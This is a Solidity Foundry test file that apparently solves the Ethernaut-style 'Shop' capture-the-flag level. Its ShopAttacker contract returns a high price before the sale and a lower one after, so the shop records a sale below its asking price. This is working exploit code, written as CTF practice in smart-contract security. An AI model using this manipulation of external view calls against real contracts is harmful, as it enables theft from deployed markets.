// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/21-Shop.sol";

contract ShopTest is Test {
    Shop public shopCTF;
    ShopAttacker public shopAttacker;
    address public player = address(0x1);
    address public receiver = address(0x2);

    function setUp() public {
        shopCTF = new Shop();
        shopAttacker = new ShopAttacker(shopCTF);
    }

    function testAttack() public {
        shopAttacker.attack();

        assertEq(shopCTF.isSold(), true);
        assertEq(shopCTF.price(), 99);
    }
}

contract ShopAttacker is Buyer {
    Shop public shopCTF;
    bool isSold = false;

    constructor(Shop _shopCTF) {
        shopCTF = _shopCTF;
    }

    function price() external view returns (uint256) {
        if (shopCTF.isSold()) {
            return 99;
        }
        return 101;
    }

    function attack() external {
        shopCTF.buy();
    }
}
